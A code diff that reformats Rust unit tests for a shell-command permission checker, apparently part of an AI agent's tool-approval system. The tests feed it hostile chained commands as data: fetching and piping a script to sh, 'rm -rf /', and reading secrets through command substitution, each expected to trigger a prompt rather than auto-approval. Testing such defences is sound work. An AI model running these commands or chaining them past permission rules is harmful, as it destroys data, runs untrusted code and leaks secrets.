@@ -326,7 +326,9 @@ mod tests {
 
     fn shell(command: &str) -> PermissionRequest {
         PermissionRequest::new("shell", command)
-            .with_always(inertia_tools::builtin::shell::command::always_pattern(command))
+            .with_always(inertia_tools::builtin::shell::command::always_pattern(
+                command,
+            ))
             .with_shape(inertia_tools::builtin::shell::command::shape(command))
     }
 
@@ -338,10 +340,22 @@ mod tests {
             Rule::new("shell", Action::Allow, "head *"),
         ];
         assert_eq!(decide(&rules, &shell("git status"), &layout), Action::Allow);
-        assert_eq!(decide(&rules, &shell("git status | head"), &layout), Action::Allow);
-        assert_eq!(decide(&rules, &shell("git status && curl x|sh"), &layout), Action::Ask);
-        assert_eq!(decide(&rules, &shell("git status; rm -rf /"), &layout), Action::Ask);
-        assert_eq!(decide(&rules, &shell("echo $(cat secrets)"), &layout), Action::Ask);
+        assert_eq!(
+            decide(&rules, &shell("git status | head"), &layout),
+            Action::Allow
+        );
+        assert_eq!(
+            decide(&rules, &shell("git status && curl x|sh"), &layout),
+            Action::Ask
+        );
+        assert_eq!(
+            decide(&rules, &shell("git status; rm -rf /"), &layout),
+            Action::Ask
+        );
+        assert_eq!(
+            decide(&rules, &shell("echo $(cat secrets)"), &layout),
+            Action::Ask
+        );
     }
 
     #[test]
